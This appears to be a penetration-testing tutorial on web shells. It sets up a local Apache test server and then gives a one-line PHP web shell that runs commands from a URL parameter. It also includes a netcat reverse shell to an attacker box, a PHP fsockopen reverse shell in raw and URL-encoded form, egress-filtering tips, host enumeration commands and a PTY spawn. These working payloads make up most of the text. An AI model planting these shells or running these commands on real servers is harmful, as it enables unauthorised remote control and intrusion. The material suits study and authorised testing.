# Web Shells

A web shell is a server-side script that becomes a web interface for remote administration and executing system commands. They can be written in pretty much any langauge, but typically written in PHP, ASP, Perl, Python, and Ruby.

Lets create a simple PHP web shell and test it on an Apache server. First, let's secure our web server to prevent backdooring our own system. 
```bash
# Create a rule that only allows port 80 from local machine. 
iptables -A INPUT -i lo -p tcp --dport 80 -j ACCEPT

# Create a rule that blocks all traffic on port 80
iptables -A INPUT -p tcp --dport 80 -j DROP

# Print active rules to the terminal
iptables -S

# Accept connections from a specific source
iptables -A INPUT -s [source IP] -p tcp --dport 80 -j ACCEPT

# Rules are not persistent so they are flushed on reboot. Can force flush
iptables -F

# Disable PHP functions
vim /etc/php/7.0/apache2/php.ini || /etc/php5/apache2/php.ini

# Edit the disable_functions section and add the following:
=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

# Restart the service
service apache2 restart
```

## Create the Web Shell

```bash
touch /var/www/html/webshell.php

# Edit the file, add the following:
<?php scho shell_exec($_GET['cmd']); ?>

# Restart apache
service apache2 start

# Execute the web shell script:
http://127.0.0.1/webshell.php?cmd=[command here]
# E.g.
http://127.0.0.1/webshell.php?cmd=id

# If this is an existing PHP Web Root, you can modify an existing file

# Remove the Web Shell
rm /var/www/html/webshell.php

# Flush IPtables
iptables -F
```

### From Web Shell to Command Line Shell

If we can execute system commands, we can try to initiate a reverse shell:

```bash
http://127.0.0.1/wordpress/?cmd=nc [IP attack box] [port] -e /bin/sh
```

### Common Issues

Compromised hosts rarely have `nc` installed, and a reverse shell command can generate errors with no response. You also need to consider firewalls, permissions, directories, web server settings, SELinux, etc.
### Egress Filtering

Try specifying different ports that are typically allowed outbound (53, 80, 443). Make sure you aren't listening on a port served by other services though. 

### Dependencies

It's important to enumerate the options for your web shell. You can't execute Python on a system that doesn't have it. 
We can execute the following to help verify through the web shell:

```bash
php -v	# PHP version
python -V	# Python version
perl -v	# Perl version
ls /usr/bin	# Directory contents /usr/bin
uname -a	# System information Linux
dir C:\”Program Files”	# Directory contents Windows Program Files folder
systeminfo	# System information Windows
id	# Current user Linux
whoami	# Current user Windows
pwd	# Print working directory
```

### URL Encoding

URLs can only contain characters from US-ASCII - special characters typically need to be encoded, such as ` %&=;+'"` 
For example the following reverse shell if executed through Burp:

```php
php -r '$sock=fsockopen("127.0.0.1",81);exec("/bin/sh -i <&3 >&3 2>&3");'
  # Returns "THe contents of the cmd parameter are broken by the ampersand"
```

So we need to properly URL-encode the command like this:
```php
php%20-r%20%27%24sock%3Dfsockopen%28%22127.0.0.1%22%2C81%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

### Extras

The reverse shell script on the following link can be uploaded and injected in existing PHP code on Linux hosts: http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Try to focus on those things you can get to work. See what files you can read or what other important information you can recover that may help.

Use the following command to spawn a PTY shell with Python:

```
python -c 'import pty; pty.spawn("/bin/bash");'
```

(PTY stands for ‘pseudo-teletype’ which emulates and has the functions of a terminal without actually being one).
